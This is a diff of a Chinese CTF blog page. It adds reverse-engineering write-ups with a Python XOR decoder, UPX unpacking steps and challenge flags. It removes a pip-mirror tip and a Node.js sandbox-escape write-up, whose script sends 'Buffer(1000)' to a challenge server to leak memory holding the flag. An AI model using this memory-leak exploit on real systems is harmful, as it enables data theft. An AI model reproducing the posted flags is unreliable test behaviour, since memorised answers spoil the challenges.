@@ -108,6 +108,133 @@
     
     
     <article
+  id="post-5_game"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/5_game/"
+    >5_game</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/5_game/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="5-game"><a href="#5-game" class="headerlink" title="5_game"></a>5_game</h1><p>丢ida 找main f5</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9u3wrzcj31ld0x41kx.jpg" alt="image.png"></p>
+<p>很容易发现 </p>
+<p>sub_457AB4(); 就是flag</p>
+<p>进入<img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9vdyxu3j307o0390t5.jpg" alt="image.png"></p>
+<p>在进入</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9vxqnzpj30gd0lu79k.jpg" alt="image.png"></p>
+<h2 id="qmemcpy"><a href="#qmemcpy" class="headerlink" title="qmemcpy"></a>qmemcpy</h2><p>  void * memcpy ( void * dest, const void * src, size_t num );</p>
+<p>并不关心被复制的数据类型，只是逐字节地进行复制，这给函数的使用带来了很大的灵活性，可以面向任何数据类型进行复制。</p>
+<h2 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h2><p>拷贝一个字符串到另一个字符串数组中</p>
+<p>根据题目构建python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">v6 = []</span><br><span class="line">v3 = []</span><br><span class="line">v4 = []</span><br><span class="line">for i in range(22):</span><br><span class="line">  v3.append(1)</span><br><span class="line">for i in range(57):</span><br><span class="line">  v6.append(1)</span><br><span class="line"></span><br><span class="line">v6[0] = 18</span><br><span class="line">v6[1] = 64</span><br><span class="line">v6[2] = 98</span><br><span class="line">v6[3] = 5</span><br><span class="line">v6[4] = 2</span><br><span class="line">v6[5] = 4</span><br><span class="line">v6[6] = 6</span><br><span class="line">v6[7] = 3</span><br><span class="line">v6[8] = 6</span><br><span class="line">v6[9] = 48</span><br><span class="line">v6[10] = 49</span><br><span class="line">v6[11] = 65</span><br><span class="line">v6[12] = 32</span><br><span class="line">v6[13] = 12</span><br><span class="line">v6[14] = 48</span><br><span class="line">v6[15] = 65</span><br><span class="line">v6[16] = 31</span><br><span class="line">v6[17] = 78</span><br><span class="line">v6[18] = 62</span><br><span class="line">v6[19] = 32</span><br><span class="line">v6[20] = 49</span><br><span class="line">v6[21] = 32</span><br><span class="line">v6[22] = 1</span><br><span class="line">v6[23] = 57</span><br><span class="line">v6[24] = 96</span><br><span class="line">v6[25] = 3</span><br><span class="line">v6[26] = 21</span><br><span class="line">v6[27] = 9</span><br><span class="line">v6[28] = 4</span><br><span class="line">v6[29] = 62</span><br><span class="line">v6[30] = 3</span><br><span class="line">v6[31] = 5</span><br><span class="line">v6[32] = 4</span><br><span class="line">v6[33] = 1</span><br><span class="line">v6[34] = 2</span><br><span class="line">v6[35] = 3</span><br><span class="line">v6[36] = 44</span><br><span class="line">v6[37] = 65</span><br><span class="line">v6[38] = 78</span><br><span class="line">v6[39] = 32</span><br><span class="line">v6[40] = 16</span><br><span class="line">v6[41] = 97</span><br><span class="line">v6[42] = 54</span><br><span class="line">v6[43] = 16</span><br><span class="line">v6[44] = 44</span><br><span class="line">v6[45] = 52</span><br><span class="line">v6[46] = 32</span><br><span class="line">v6[47] = 64</span><br><span class="line">v6[48] = 89</span><br><span class="line">v6[49] = 45</span><br><span class="line">v6[50] = 32</span><br><span class="line">v6[51] = 65</span><br><span class="line">v6[52] = 15</span><br><span class="line">v6[53] = 34</span><br><span class="line">v6[54] = 18</span><br><span class="line">v6[55] = 16</span><br><span class="line">v6[56] = 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v3[0] = 123</span><br><span class="line">v3[1] = 32</span><br><span class="line">v3[2] = 18</span><br><span class="line">v3[3] = 98</span><br><span class="line">v3[4] = 119</span><br><span class="line">v3[5] = 108</span><br><span class="line">v3[6] = 65</span><br><span class="line">v3[7] = 41</span><br><span class="line">v3[8] = 124</span><br><span class="line">v3[9] = 80</span><br><span class="line">v3[10] = 125</span><br><span class="line">v3[11] = 38</span><br><span class="line">v3[12] = 124</span><br><span class="line">v3[13] = 111</span><br><span class="line">v3[14] = 74</span><br><span class="line">v3[15] = 49</span><br><span class="line">v3[16] = 83</span><br><span class="line">v3[17] = 108</span><br><span class="line">v3[18] = 94</span><br><span class="line">v3[19] = 108</span><br><span class="line">v3[20] = 84</span><br><span class="line">v3[21] = 6</span><br><span class="line"></span><br><span class="line">temp = &quot;`S,yhn _uec&#123;&quot;</span><br><span class="line">for i in temp:</span><br><span class="line">  # print(ord(i))</span><br><span class="line">  v3.append(ord(i))</span><br><span class="line"># print(v3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># for i in range(111):</span><br><span class="line">#   # print(ord(i))</span><br><span class="line">#   v3.append(1)</span><br><span class="line">v3.append(127)</span><br><span class="line">v3.append(119)</span><br><span class="line">v3.append(96)</span><br><span class="line">v3.append(48)</span><br><span class="line">v3.append(107)</span><br><span class="line">v3.append(71)</span><br><span class="line">v3.append(92)</span><br><span class="line">v3.append(29)</span><br><span class="line">v3.append(81)</span><br><span class="line">v3.append(107)</span><br><span class="line">v3.append(90)</span><br><span class="line">v3.append(85)</span><br><span class="line">v3.append(64)</span><br><span class="line">v3.append(12)</span><br><span class="line">v3.append(43)</span><br><span class="line">v3.append(76)</span><br><span class="line">v3.append(86)</span><br><span class="line">v3.append(13)</span><br><span class="line">v3.append(114)</span><br><span class="line">v3.append(1)</span><br><span class="line"></span><br><span class="line"># print(len(v3))</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">temp = &quot;u~&quot;</span><br><span class="line">for i in temp:</span><br><span class="line">  # print(ord(i))</span><br><span class="line">  v3.append(ord(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(56):    #56</span><br><span class="line">  v3[i] ^= v6[i]</span><br><span class="line">  v3[i] ^= 0x13</span><br><span class="line">for i in range(len(v3)):</span><br><span class="line">  print(chr(v3[i]),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwa9z6sd93j30qr09bgoh.jpg" alt="image.png"></p>
+<p>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-7_simple-unpack"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/7_simple-unpack/"
+    >simple-unpack</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/7_simple-unpack/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/">逆向</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>用pe查壳  有hint</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwakjta93ej30f6077aen.jpg" alt="image.png"></p>
+<p>Detected UPX! packer - <a target="_blank" rel="noopener" href="http://upx.github.io/">http://upx.github.io</a> -&gt; try unpack with “upx.exe -d”  from  <a target="_blank" rel="noopener" href="http://upx.github.io/">http://upx.github.io</a></p>
+<p>使用 UPX 去壳</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwaklubmwlj30s10f1dqs.jpg" alt="image.png"></p>
+<p>现在再丢pe看看</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwakmiv47rj30f6077gpy.jpg" alt="image.png"></p>
+<p>放进ida</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwakn09vunj30ma0hwdlb.jpg" alt="image.png"></p>
+<p>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-Confusion1"
   class="article article-type-post"
   itemscope
@@ -804,134 +931,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
 
 <p>如果这个文件夹有其他的文件，连接者还可以下载该目录下其他文件</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-pip换源"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/"
-    >python pip 换源</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/">生活小技巧</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="python-pip-换源"><a href="#python-pip-换源" class="headerlink" title="python pip 换源"></a>python pip 换源</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">mkdir ~/.pip;vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure>
-
-<p>添加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
-
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在user目录中创建一个pip\pip.ini</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
-
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-leaking"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/leaking/"
-    >nodejs沙箱逃逸</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/leaking/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/ctf/">ctf</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>nodejs沙箱逃逸</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwerdkcp2pj30u20ssqfb.jpg" alt="image.png"></p>
-<p>eval(“var flag_” + randomstring.generate(64) + “ = &quot;flag{“ + flag + “}&quot;;”)</p>
-<p>  if (<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12) {</p>
-<p>​    <em>var</em> vm = new VM({</p>
-<p>​      timeout: 1000</p>
-<p>​    });</p>
-<p>​    console.log(<em>req</em>.query.data);</p>
-<p>​    <em>res</em>.send(“eval -&gt;” + vm.run(<em>req</em>.query.data));</p>
-<p>  } else {</p>
-<p>​    <em>res</em>.send(fs.readFileSync(__filename).toString());</p>
-<p>  }</p>
-<p>其中 要满足<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12</p>
-<p>有get data  且长度小于12</p>
-<p>eval -&gt;” + vm.run(<em>req</em>.query.data</p>
-<p>构建payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://111.200.241.244:65075/?data=Buffer(1000)&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;42vk7uq3siu00csvncvn1cr3o4&quot;</span>, <span class="string">&quot;td_cookie&quot;</span>: <span class="string">&quot;298269563&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;W/\&quot;599-+8B/Bay7p6jffTGBFcikJZKicLY\&quot;&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">result</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + re.match(<span class="string">&quot;(.*)flag&#123;(.*)&#125;(.*)&quot;</span>, result).group(<span class="number">2</span>) + <span class="string">&quot;&#125;\n\n\n\n\n\n\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     _thread.start_new_thread(check(req()))</span></span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     print(&quot;error&quot;)</span></span><br><span class="line">        check(req())</span><br></pre></td></tr></table></figure>
-
  
       <!-- reward -->
       
